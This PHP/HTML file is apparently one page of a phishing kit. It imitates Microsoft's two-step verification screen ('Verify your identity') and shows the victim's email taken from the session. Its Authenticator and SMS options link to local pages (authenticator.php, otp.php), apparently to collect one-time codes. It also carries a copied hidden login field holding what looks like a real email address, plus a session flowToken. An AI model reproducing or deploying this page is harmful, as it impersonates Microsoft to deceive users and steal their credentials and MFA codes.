<?php 
error_reporting(0);
session_start();
$email = $_SESSION['email'];
?>
<!DOCTYPE html>
<html dir="ltr" class="" lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Sign in to your account</title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
      <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
      <link  href="./otp_files/converged.v2.login.min_8owwt4u-33ps0wawi7tmow2.css" rel="stylesheet">
      <link rel="prefetch" href="./otp_files/converged.v2.login.min_8owwt4u-33ps0wawi7tmow2.css" rel="stylesheet">
      <link rel="prefetch" href="./otp_files/ux.converged.tfa.strings-en.min_x6klxrnz09ytoalycec0tq2.js.download">
   </head>
   <body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
      <div>
         <!--  -->
         <!--  -->
         <form name="form" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="submit: form_onSubmit, autoSubmit: forceSubmit, attr: { action: svr.urlPost }" action="https://login.microsoftonline.com/common/SAS/ProcessAuth">
            <!-- ko withProperties: { '$tfaPage': $data } -->
            <div data-bind="component: { name: &#39;master-page&#39;,
               publicMethods: masterPageMethods,
               params: {
               serverData: svr,
               showButtons: svr.fShowButtons,
               showFooterLinks: true,
               handleWizardButtons: false,
               useWizardBehavior: svr.fUseWizardBehavior },
               event: {
               footerAgreementClick: footer_agreementClick } }">
               <!--  -->
               <!-- ko ifnot: useLayoutTemplates --><!-- /ko -->
               <!-- ko if: useLayoutTemplates -->
               <!-- ko withProperties: { '$page': $parent } -->
               <!-- ko if: isLightboxTemplate() -->
               <div id="lightboxTemplateContainer" data-bind="component: { name: &#39;lightbox-template&#39;, params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { &#39;provide-min-height&#39;: svr.fUseMinHeight }">
                  <!--  -->
                  <div id="lightboxBackgroundContainer" data-bind="css: { &#39;provide-min-height&#39;: svr.fUseMinHeight },
                     component: { name: &#39;background-image-control&#39;,
                     publicMethods: $page.backgroundControlMethods,
                     event: { load: $page.backgroundImageControl_onLoad } }">
                     <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                        <!-- ko if: smallImageUrl --><!-- /ko -->
                        <!-- ko if: backgroundImageUrl -->
                        <div id="backgroundImage" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { &#39;background-image&#39;: true }" class="background-image ext-background-image" style="background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
                        <!-- ko if: useImageMask --><!-- /ko -->
                        <!-- /ko -->
                     </div>
                  </div>
                  <!-- ko if: svr.iBannerEnvironment --><!-- /ko -->
                  <!-- ko withProperties: { '$masterPageContext': $parentContext } -->
                  <div class="outer" data-bind="css: { &#39;app&#39;: $page.backgroundLogoUrl }">
                     <!-- ko if: showHeader --><!-- /ko -->
                     <div class="template-section main-section">
                        <div data-bind="externalCss: { &#39;middle&#39;: true }" class="middle ext-middle">
                           <div class="full-height" data-bind="component: { name: &#39;content-control&#39;, params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }">
                              <!--  -->
                              <!-- ko withProperties: { '$content': $data } -->
                              <div class="flex-column">
                                 <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->
                                 <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->
                                 <div class="win-scroll">
                                    <div id="lightbox" data-bind="
                                       animationEnd: $page.paginationControlHelper.animationEnd,
                                       externalCss: { &#39;sign-in-box&#39;: true },
                                       css: {
                                       &#39;inner&#39;:  $content.isVerticalSplitTemplate,
                                       &#39;vertical-split-content&#39;: $content.isVerticalSplitTemplate,
                                       &#39;app&#39;: $page.backgroundLogoUrl,
                                       &#39;wide&#39;: $page.paginationControlHelper.useWiderWidth,
                                       &#39;fade-in-lightbox&#39;: $page.fadeInLightBox,
                                       &#39;has-popup&#39;: $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                                       &#39;transparent-lightbox&#39;: $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                                       &#39;lightbox-bottom-margin-debug&#39;: $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
                                       <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->
                                       <div class="lightbox-cover" data-bind="css: { &#39;disable-lightbox&#39;: svr.fAllowGrayOutLightBox &amp;&amp; isRequestPending() }"></div>
                                       <!-- ko if: isRequestPending --><!-- /ko -->
                                       <div>
                                          <!-- ko if: loadBannerLogo -->
                                          <div data-bind="component: { name: &#39;logo-control&#39;,
                                             params: {
                                             isChinaDc: svr.fIsChinaDc,
                                             bannerLogoUrl: $tfaPage.bannerLogoUrl() } }">
                                             <!--  -->
                                             <!-- ko if: bannerLogoUrl --><!-- /ko -->
                                             <!-- ko if: !bannerLogoUrl && !isChinaDc -->
                                             <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
                                             <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                             <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str[&#39;MOBILE_STR_Footer_Microsoft&#39;] }" src="./otp_files/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
                                             <!-- /ko --><!-- /ko -->
                                             <!-- /ko -->
                                          </div>
                                          <!-- /ko -->
                                          <!-- ko if: asyncInitReady -->
                                          <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                                             publicMethods: paginationControlMethods,
                                             params: {
                                             enableCssAnimation: svr.fEnableCssAnimation,
                                             disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                                             initialViewId: initialViewId,
                                             initialSharedData: initialSharedData,
                                             initialError: $tfaPage.serverError },
                                             event: {
                                             cancel: paginationControl_onCancel,
                                             load: paginationControlHelper.onLoad,
                                             unload: paginationControlHelper.onUnload,
                                             loadView: view_onLoadView,
                                             showView: view_onShow,
                                             setLightBoxFadeIn: view_onSetLightBoxFadeIn } }">
                                             <!--  -->
                                             <div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }" class="">
                                                <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
                                                <div data-bind="css: {
                                                   &#39;animate&#39;: animate() &amp;&amp; animate.animateBanner(),
                                                   &#39;slide-out-next&#39;: animate.isSlideOutNext(),
                                                   &#39;slide-in-next&#39;: animate.isSlideInNext(),
                                                   &#39;slide-out-back&#39;: animate.isSlideOutBack(),
                                                   &#39;slide-in-back&#39;: animate.isSlideInBack() }" class="animate slide-in-next">
                                                   <div data-bind="component: { name: &#39;identity-banner-control&#39;,
                                                      params: {
                                                      userTileUrl: svr.urlProfilePhoto,
                                                      displayName: sharedData.displayName || svr.sPOST_Username,
                                                      isBackButtonVisible: isBackButtonVisible(),
                                                      focusOnBackButton: isBackButtonFocused(),
                                                      backButtonDescribedBy: backButtonDescribedBy() },
                                                      event: {
                                                      backButtonClick: identityBanner_onBackButtonClick } }">
                                                      <!--  -->
                                                      <div class="identityBanner">
                                                         <!-- ko if: isBackButtonVisible --><!-- /ko -->
                                                         <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }" title="<?php echo $email; ?>"><?php echo $email; ?></div>
                                                      </div>
                                                   </div>
                                                </div>
                                                <!-- /ko -->
                                                <div class="pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
                                                   &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
                                                   &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
                                                   &#39;animate&#39;: animate(),
                                                   &#39;slide-out-next&#39;: animate.isSlideOutNext(),
                                                   &#39;slide-in-next&#39;: animate.isSlideInNext(),
                                                   &#39;slide-out-back&#39;: animate.isSlideOutBack(),
                                                   &#39;slide-in-back&#39;: animate.isSlideInBack() }">
                                                   <!-- ko foreach: views -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                   <!-- ko template: { nodes: [$data], data: $parent } -->
                                                   <div data-viewid="2" data-showidentitybanner="true" data-bind="pageViewComponent: { name: &#39;otc-request-view&#39;,
                                                      params: {
                                                      serverData: svr,
                                                      serverError: initialError,
                                                      renderProofsInline: true,
                                                      username: sharedData.username,
                                                      otcProofs: sharedData.otcProofs,
                                                      isInitialState: isInitialState,
                                                      showCancelButton: sharedData.showCancelButton,
                                                      hideSmsInMfaProofs: sharedData.hideSmsInMfaProofs,
                                                      focusDefaultField: true },
                                                      event: {
                                                      cancel: view_onCancel,
                                                      redirect: $tfaPage.view_onRedirect,
                                                      showDebugDetails: $tfaPage.toggleDebugDetails_onClick,
                                                      setPendingRequest: $tfaPage.view_onSetPendingRequest,
                                                      updateSessionIdentifier: $tfaPage.view_onUpdateSessionIdentifier,
                                                      showMoreProofs: $tfaPage.view_onShowMoreProofs } }">
                                                      <!--  -->
                                                      <!-- ko if: defaultProof && sending() --><!-- /ko -->
                                                      <!-- ko ifnot: defaultProof && sending() -->
                                                      <div id="idDiv_SAOTCS_Title" class="row text-title" role="heading" aria-level="1" data-bind="text: str[&#39;CT_SAOTCC_STR_Title&#39;]">Verify your identity</div>
                                                      <!-- ko if: svr.fIsChallengeDueToAuthenticationStrengths --><!-- /ko -->
                                                      <div id="idDiv_SAOTCS_Proofs_Section">
                                                         <!-- ko if: serverError --><!-- /ko -->
                                                         <div id="idDiv_SAOTCS_Proofs" class="form-group" role="list" data-bind="css: { &#39;binaryChoice list&#39;: svr.fSupportWindowsStyles }" aria-labelledby="idDiv_SAOTCS_Error_OTC idDiv_SAOTCS_Title">
                                                            <!-- ko foreach: { data: proofs } -->
                                                            <!-- ko if: $parent.isProofVisible(type) -->
                                                            <div class="row tile" role="listitem">
                                                               <div class="table" tabindex="0" role="button" data-bind="
                                                                  attr: { &#39;data-value&#39;: value },
                                                                  css: { &#39;list-item&#39;: svr.fSupportWindowsStyles },
                                                                  ariaDescribedBy: $data === $parent.focusedProof() ? &#39;idDiv_SAOTCS_Title&#39; : null,
                                                                  click: $parent.proof_onClick,
                                                                  pressEnter: $parent.proof_onClick,
                                                                  hasFocus: $data === $parent.focusedProof()" data-value="OneWaySMS" aria-describedby="idDiv_SAOTCS_Title">
                                                                  <div class="table-row">
                                                                     <div class="table-cell tile-img">
                                                                        <div data-bind="component: { name: &#39;proof-image-control&#39;, params: { type: type } }">
                                                                           <!--  -->
                                                                           <!-- ko if: type === PROOF.Type.Email --><!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile -->
                                                                           <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
                                                                           <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                                                           <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img" role="presentation" pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/picker_verify_sms_b15dda889e9803e9d6befd60000fadf8.png" svgsrc="otp_files/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg" data-bind="imgSrc, css: { &#39;small&#39;: small, &#39;animate-pulse&#39;: animate }" src="otp_files/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg"><!-- /ko -->
                                                                           <!-- /ko --><!-- /ko -->
                                                                           <!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 --><!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.Certificate --><!-- /ko -->
                                                                        </div>
                                                                     </div>
                                                                     <div class="table-cell text-left content" data-bind="css: { &#39;content&#39;: !svr.fSupportWindowsStyles }">
                                                                        <a href="authenticator.php" style="text-decoration:none" ><div data-bind="text: display">Authenticator</div></a>
                                                                     </div>
                                                                  </div>
                                                               </div>
                                                            </div>
                                                            <!-- /ko -->
                                                            <!-- ko if: $parent.isProofVisible(type) -->
                                                            <div class="row tile" role="listitem">
                                                               <div class="table" tabindex="0" role="button" data-bind="
                                                                  attr: { &#39;data-value&#39;: value },
                                                                  css: { &#39;list-item&#39;: svr.fSupportWindowsStyles },
                                                                  ariaDescribedBy: $data === $parent.focusedProof() ? &#39;idDiv_SAOTCS_Title&#39; : null,
                                                                  click: $parent.proof_onClick,
                                                                  pressEnter: $parent.proof_onClick,
                                                                  hasFocus: $data === $parent.focusedProof()" data-value="TwoWayVoiceMobile">
                                                                  <div class="table-row">
                                                                     <div class="table-cell tile-img">
                                                                        <div data-bind="component: { name: &#39;proof-image-control&#39;, params: { type: type } }">
                                                                           <!--  -->
                                                                           <!-- ko if: type === PROOF.Type.Email --><!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile --><!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice -->
                                                                           <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
                                                                           <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                                                           <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img" role="presentation" pngsrc="./otp_files/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg" svgsrc="./otp_files/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg" data-bind="imgSrc, css: { &#39;small&#39;: small, &#39;animate-pulse&#39;: animate }" src="./otp_files/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg"><!-- /ko -->
                                                                           <!-- /ko --><!-- /ko -->
                                                                           <!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 --><!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko -->
                                                                           <!-- ko if: type === PROOF.Type.Certificate --><!-- /ko -->
                                                                        </div>
                                                                     </div>
                                                                     <div class="table-cell text-left content" data-bind="css: { &#39;content&#39;: !svr.fSupportWindowsStyles }">
                                                                        <a href="otp.php" style="text-decoration:none" ><div data-bind="text: display">Text +X XXX-XXX-XXXX‎</div></a>
                                                                     </div>
                                                                  </div>
                                                               </div>
                                                            </div>
                                                            <!-- /ko -->
                                                            <!-- /ko -->
                                                         </div>
                                                      </div>
                                                      <div data-bind="css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }" class="position-buttons">
                                                         <div class="row">
                                                            <!-- ko if: showHaveCodeSection || showMoreProofsLink() || lostProof || svr.urlMoreInfo || svr.fShowAuthMethodsUpdateLink -->
                                                            <div class="col-md-24">
                                                               <div class="text-13">
                                                                  <!-- ko if: showHaveCodeSection --><!-- /ko -->
                                                                  <!-- ko if: showMoreProofsLink --><!-- /ko -->
                                                                  <!-- ko if: lostProof && !showMoreProofsLink() --><!-- /ko -->
                                                                  <!-- ko if: svr.urlMoreInfo -->
                                                                  <div class="form-group">
                                                                     <a id="moreInfoUrl" target="_blank" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" data-bind="
                                                                        text: str[&#39;CT_STR_More_Info&#39;],
                                                                        href: svr.urlMoreInfo,
                                                                        ariaLabel: str[&#39;CT_STR_More_Info_AriaLabel&#39;]" aria-label="More information about two step verification">More information</a>
                                                                  </div>
                                                                  <!-- /ko -->
                                                                  <!-- ko if: svr.fShowAuthMethodsUpdateLink -->
                                                                  <div class="text-13 form-group">
                                                                     <span data-bind="text: str[&#39;CT_SAOTCS_STR_Update_Auth_Methods_Link&#39;]">Are your verification methods current? Check at https://aka.ms/mfasetup</span>
                                                                  </div>
                                                                  <!-- /ko -->
                                                               </div>
                                                            </div>
                                                            <!-- /ko -->
                                                         </div>
                                                      </div>
                                                      <div class="win-button-pin-bottom" data-bind="css : { &#39;boilerplate-button-bottom&#39;: tenantBranding.BoilerPlateText }">
                                                         <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }">
                                                            <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
                                                               params: {
                                                               serverData: svr,
                                                               removeBottomMargin: true,
                                                               secondaryButtonId: &#39;idBtn_SAOTCS_Cancel&#39;,
                                                               secondaryButtonText: secondaryButtonValue(),
                                                               isPrimaryButtonVisible: false,
                                                               isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; showCancelButton },
                                                               event: {
                                                               primaryButtonClick: primaryButton_onClick,
                                                               secondaryButtonClick: secondaryButton_onClick } }">
                                                               <div class="col-xs-24 no-padding-left-right button-container no-margin-bottom button-field-container ext-button-field-container" data-bind="
                                                                  visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                                                  css: { &#39;no-margin-bottom&#39;: removeBottomMargin },
                                                                  externalCss: { &#39;button-field-container&#39;: true }">
                                                                  <!-- ko if: isSecondaryButtonVisible -->
                                                                  <div data-bind="css: { &#39;inline-block&#39;: true }, externalCss: { &#39;button-item&#39;: true }" class="inline-block button-item ext-button-item">
                                                                     <input type="button" id="idBtn_SAOTCS_Cancel" class="win-button button-secondary button ext-button secondary ext-secondary" data-bind="
                                                                        attr: { &#39;id&#39;: secondaryButtonId || &#39;idBtn_Back&#39; },
                                                                        externalCss: {
                                                                        &#39;button&#39;: true,
                                                                        &#39;secondary&#39;: true },
                                                                        value: secondaryButtonText() || str[&#39;CT_HRD_STR_Splitter_Back&#39;],
                                                                        ariaDescribedBy: secondaryButtonDescribedBy,
                                                                        hasFocus: focusOnSecondaryButton,
                                                                        click: secondaryButton_onClick,
                                                                        enable: isSecondaryButtonEnabled" value="Cancel">
                                                                  </div>
                                                                  <!-- /ko -->
                                                                  <div data-bind="css: { &#39;inline-block&#39;: isPrimaryButtonVisible }, externalCss: { &#39;button-item&#39;: true }" class="button-item ext-button-item">
                                                                     <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
                                                                     <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                                                                        attr: primaryButtonAttributes,
                                                                        externalCss: {
                                                                        &#39;button&#39;: true,
                                                                        &#39;primary&#39;: true },
                                                                        value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
                                                                        hasFocus: focusOnPrimaryButton,
                                                                        click: primaryButton_onClick,
                                                                        enable: isPrimaryButtonEnabled,
                                                                        visible: isPrimaryButtonVisible,
                                                                        preventTabbing: primaryButtonPreventTabbing" value="Next" data-report-attached="1" style="display: none;">
                                                                  </div>
                                                               </div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                      <!-- /ko -->
                                                      <!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
                                                   </div>
                                                   <!-- /ko -->
                                                   <!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                   <!-- /ko -->
                                                </div>
                                             </div>
                                          </div>
                                          <!-- /ko -->
                                       </div>
                                       <input type="hidden" name="login" data-bind="value: postUsername" value="cwatts@techsafety.com">
                                       <input type="hidden" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAAD--DLA3VO7QrddgJg7WevrBo2KdaTZXvdDGkRAqZ9IqlYCIg2tiOX901Jpg_gsf782T6ogz8756nwlDKDZODpc9Z3HdGSJ6UYgQQFAxHHbz0iNhqynsrjcniMUrj4gyiAaHfCaqXccsmnJiuOsvlSsvjJmAK1vPxgNmBS3Xgy_hxa9InV52PInxyVVzfAOMMaTtg0dL4kswjY3O0YqnTRd4GO9PfG3WDjK3DKhXuzYfdj3BnrG7hv8sgspm0khxIsdW3uTM2aVoNTUqMHImc_lVqhWzMXQP5-7QkzzdkEpmeA7sFGaw-AGSy3Xg5KOUdUoWcaXVE3KFkJDQLe5wPjOq6sjm5QYitjrsZiPXmVPq_wSHxJ_7ahcfAI1KV75DnpxHTWoD41XxxzaFAVqTZ3K7wjYiDpDPI8nSKNX_uCQeNdi_mvIC97BKea8AZC6vHk928kSGxoinSx0ac-zTc9PpElQAhOYIwivJ75dcgw0ytbMpDbzDtvuM_RkIuH_MdHfqpp3wYzOg6BaOvujCaFDmBccTLTHheLgFMVbOp2oKeDAU7_Ue8Vg3e390_s_7mA_PRvimrBADtDJ_6WR5HA7ZhheBfHd8ZonALTa3CdcRERH1b5tpEOhPm6312QFNPPKNGYyHxb1FOMAmXss8ts3DVAIeUDb94mDdaydxL2XufGcMikJTdO2JeCLMZU5ZIKC8VJI2-DmnV1TmdzSOo6SC6fMldZyM-6rfOQ0YgWRxBcNPuF1sJP6XYaXCJYU9AoutvqsWFWTyKIS6Y6-9DlU35_2etKaqO15xyUp96-YiRUFxBJWQgld6rsLSEjODFQK4islwFku5byXM364wldIGRVnHbi2dBtNRnW_xhYUL5fUucGayuaVbBSkesZ9CXqHHCJ9V_j8_C3Ddcqf3RgRl1SSXgACuTg_n3AC9aetLtStZonlSXZz4rn4K2A82gggAA">
                                       <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="baf6bf28-2ee7-47a0-b65f-f7594fb70c00">
                                       <input type="hidden" name="sacxt" data-bind="value: svr.iSAContext" value="">
                                       <input type="hidden" name="hideSmsInMfaProofs" data-bind="value: hideSmsInMfaProofs" value="false">
                                       <!-- ko if: sessionIdentifier --><!-- /ko -->
                                       <div data-bind="component: { name: &#39;instrumentation-control&#39;,
                                          publicMethods: instrumentationMethods,
                                          params: { serverData: svr } }">
                                          <input type="hidden" name="i19" data-bind="value: timeOnPage" value="">
                                       </div>
                                       <!-- /ko -->
                                    </div>
                                    <!-- ko if: $page.showFedCredAndNewSession --><!-- /ko -->
                                    <!-- ko if: $page.showDebugDetails --><!-- /ko -->
                                 </div>
                              </div>
                              <!-- /ko -->
                           </div>
                        </div>
                     </div>
                     <!-- ko if: $page.paginationControlHelper.showFooterControl -->
                     <div id="footer" role="contentinfo" data-bind="
                        externalCss: {
                        &#39;footer&#39;: true,
                        &#39;has-background&#39;: !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
                        &#39;background-always-visible&#39;: $page.backgroundLogoUrl }" class="footer ext-footer">
                        <div data-bind="component: { name: &#39;footer-control&#39;,
                           publicMethods: $page.footerMethods,
                           params: {
                           serverData: svr,
                           useDefaultBackground: $page.useDefaultBackground(),
                           hasDarkBackground: $page.backgroundLogoUrl(),
                           showLinks: true,
                           showFooter: $page.showFooter(),
                           hideTOU: $page.hideTOU(),
                           termsText: $page.termsText(),
                           termsLink: $page.termsLink(),
                           hidePrivacy: $page.hidePrivacy(),
                           privacyText: $page.privacyText(),
                           privacyLink: $page.privacyLink() },
                           event: {
                           agreementClick: $page.footer_agreementClick,
                           showDebugDetails: $page.toggleDebugDetails_onClick } }">
                           <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
                           <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { &#39;footer-links&#39;: true }">
                              <!-- ko if: showFooter -->
                              <!-- ko if: !hideTOU -->
                              <a id="ftrTerms" data-bind="
                                 text: termsText,
                                 href: termsLink,
                                 click: termsLink_onClick,
                                 externalCss: {
                                 &#39;footer-content&#39;: true,
                                 &#39;footer-item&#39;: true,
                                 &#39;has-background&#39;: !useDefaultBackground,
                                 &#39;background-always-visible&#39;: hasDarkBackground }" href="https://www.microsoft.com/en-US/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
                              <!-- /ko -->
                              <!-- ko if: !hidePrivacy -->
                              <a id="ftrPrivacy" data-bind="
                                 text: privacyText,
                                 href: privacyLink,
                                 click: privacyLink_onClick,
                                 externalCss: {
                                 &#39;footer-content&#39;: true,
                                 &#39;footer-item&#39;: true,
                                 &#39;has-background&#39;: !useDefaultBackground,
                                 &#39;background-always-visible&#39;: hasDarkBackground }" href="https://privacy.microsoft.com/en-US/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
                              <!-- /ko -->
                              <!-- ko if: impressumLink --><!-- /ko -->
                              <!-- ko if: a11yConformeLink --><!-- /ko -->
                              <!-- ko if: showIcpLicense --><!-- /ko -->
                              <!-- /ko -->
                              <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
                              <a id="moreOptions" href="https://login.microsoftonline.com/common/login#" role="button" data-bind="
                                 click: moreInfo_onClick,
                                 ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
                                 attr: { &#39;aria-expanded&#39;: showDebugDetails().toString() },
                                 hasFocusEx: focusMoreInfo(),
                                 externalCss: {
                                 &#39;footer-content&#39;: true,
                                 &#39;footer-item&#39;: true,
                                 &#39;debug-item&#39;: true,
                                 &#39;has-background&#39;: !useDefaultBackground,
                                 &#39;background-always-visible&#39;: hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                           </div>
                           <!-- /ko -->
                           <!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko -->
                        </div>
                     </div>
                     <!-- /ko -->
                  </div>
                  <!-- /ko -->
               </div>
               <!-- /ko -->
               <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
               <!-- /ko -->
               <!-- /ko -->
            </div>
            <!-- /ko -->
         </form>
      </div>
   </body>
</html>
